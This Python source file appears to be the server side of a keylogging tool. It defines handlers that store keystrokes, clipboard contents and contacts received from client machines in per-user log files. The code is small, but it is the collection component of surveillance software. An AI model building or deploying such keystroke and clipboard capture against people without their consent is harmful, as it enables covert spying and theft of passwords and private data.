"""
Edan Jacobson
Methods for requests from client
"""

from constants import USER_DATABASE_DIRECTORY, CONTACT_PATH, REMOVE_ONE


class Methods(object):
    @staticmethod
    def KEYLOGGER(param, user):
        """
        Method that receives key logs and adds them to file of user
        :param param:
        :param user:
        :return:
        """
        # Construct the path to the keylogger file
        path = USER_DATABASE_DIRECTORY + "\\" + user + r"\keylogger.txt"

        if param == "BACKSPACE":
            # Remove the last character from the file
            with open(path, "r") as file:
                text = file.read()
            with open(path, "w") as file:
                file.write(text[:REMOVE_ONE])
        else:
            # Append the parameter to the file
            with open(path, "a") as file:
                file.write(param)

    @staticmethod
    def CLIPBOARD(param, user):
        """
        Method that receives clipboard logs and adds them to file of user
        :param param:
        :param user:
        :return:
        """
        # Construct the path to the clipboard file
        dir_path = USER_DATABASE_DIRECTORY + "\\" + user + r"\clipboard.txt"

        # Append the parameter to the file
        with open(dir_path, "a") as file:
            file.write(param)

    @staticmethod
    def CONTACTS(param, user=None):
        """
        Method that receives clipboard logs and adds them to contact file
        :param param:
        :param user:
        :return:
        """
        # Append the parameter to the contacts file
        with open(CONTACT_PATH, "a") as file:
            file.write(param)
